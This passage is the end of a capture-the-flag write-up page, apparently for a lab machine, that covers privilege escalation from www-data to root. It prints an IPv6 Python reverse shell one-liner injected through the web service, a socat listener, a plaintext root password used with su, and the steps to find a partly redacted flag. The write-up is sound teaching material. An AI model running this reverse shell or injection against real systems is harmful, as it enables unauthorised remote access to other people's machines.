+<span class="gp">  #</span><span class="w"> </span>owner: root
+<span class="gp">  #</span><span class="w"> </span>group: root
+<span class="gp">  #</span><span class="w"> </span>flags: s--
+<span class="go">  user::rwx
+  user:loki:r--
+  group::r-x
+  mask::r-x
+  other::r-x
+
+</span><span class="gp">  #</span><span class="w"> </span>file: bin/su
+<span class="gp">  #</span><span class="w"> </span>owner: root
+<span class="gp">  #</span><span class="w"> </span>group: root
+<span class="gp">  #</span><span class="w"> </span>flags: s--
+<span class="go">  user::rwx
+  user:loki:r--
+  group::r-x
+  mask::r-x
+  other::r-x
+  
+</span></code></pre></div>    </div>
+    <p><strong>NOTE(S)</strong>:</p>
+    <ul>
+      <li>The user, <strong><code class="highlighter-rouge">loki</code></strong>, only has read (<strong><code class="highlighter-rouge">r--</code></strong>) permissions for both <strong><code class="highlighter-rouge">su</code></strong> and <strong><code class="highlighter-rouge">sudo</code></strong></li>
+      <li>Good thing we still have access to another user – <strong><code class="highlighter-rouge">www-data</code></strong></li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="part-52--privilege-escalation-www-data---root">PART 5.2 : PRIVILEGE ESCALATION (www-data -&gt; root)</h2>
+
+<ul>
+  <li>Set-up a listener for IPv6:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>socat TCP6-LISTEN:4444 stdout
+</code></pre></div>    </div>
+  </li>
+  <li>Execute an IPv6 reverse shell on the web service running on <strong>port 80</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100e",4444,0,0));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</span><span class="p">;</span> ping <span class="nt">-c</span> 2 127.0.0.1
+</code></pre></div>    </div>
+  </li>
+  <li>While inside the <strong>reverse shell</strong>:
+    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">id</span> 
+<span class="go">
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+</span><span class="gp">$</span><span class="w"> </span>su
+<span class="gp">$</span><span class="w"> </span>Password: lokipasswordmischieftrickery
+<span class="go">
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">   
+  uid=0(root) gid=0(root) groups=0(root)
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /root/root.txt
+<span class="go">
+  The flag is not here, get a shell to find it!
+
+</span><span class="gp">$</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt <span class="nt">-type</span> f <span class="nt">-uid</span> 0
+<span class="go">
+  /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+  /root/root.txt
+
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+<span class="go">
+  ae15........................7807
+
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+</section>
+       </div>
+    </div>
+
+    <script>
+      function openNav() {
+        document.getElementById("sidebar").style.width = "250px";
+        document.getElementById("content").style.marginLeft = "250px";
+      }
+      function closeNav() {
+        document.getElementById("sidebar").removeAttribute("style");
+        document.getElementById("content").removeAttribute("style");
+      } 
+    </script>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
